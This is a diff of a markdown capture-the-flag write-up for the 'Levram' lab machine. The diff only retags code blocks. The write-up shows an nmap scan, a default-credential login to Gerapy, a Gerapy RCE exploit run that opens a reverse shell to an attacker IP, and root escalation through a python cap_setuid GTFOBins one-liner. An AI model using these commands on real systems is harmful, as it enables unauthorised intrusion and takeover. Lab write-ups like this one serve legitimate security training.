@@ -3,7 +3,7 @@
 # 🐧Levram🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.237.24 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 18:39 AEDT
 Nmap scan report for 192.168.237.24
@@ -18,7 +18,7 @@ port 8000 is a web running GERAPY
 use default credential admin admin logged in  
 nothing inside  
 searchsploit found a RCE script
-```
+```console
 $ searchsploit gerapy   
 -------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                  |  Path
@@ -27,7 +27,7 @@ Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                      
 ```
 
 run the script and get the shell
-```
+```console
 $ python3 gerapy_rce.py -t 192.168.237.24 -p 8000 -L 192.168.45.201 -P 8000
 /home/ming/.local/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.11) doesn't match a supported version!
   warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
@@ -62,15 +62,15 @@ uid=1000(app) gid=1000(app) groups=1000(app)
 ## Privlege Escalation  
 
 upload linpeas and found the python 3.10 have SUID 
-```
+```console
 /usr/bin/python3.10 cap_setuid=ep
 ```
 search GTFOBin and found the way to root  
 https://gtfobins.org/gtfobins/python/#shell
-```
+```console
 python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
-```
+```console
 app@ubuntu:~/gerapy$ python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")' 
 root@ubuntu:~/gerapy# id
 uid=0(root) gid=1000(app) groups=1000(app)
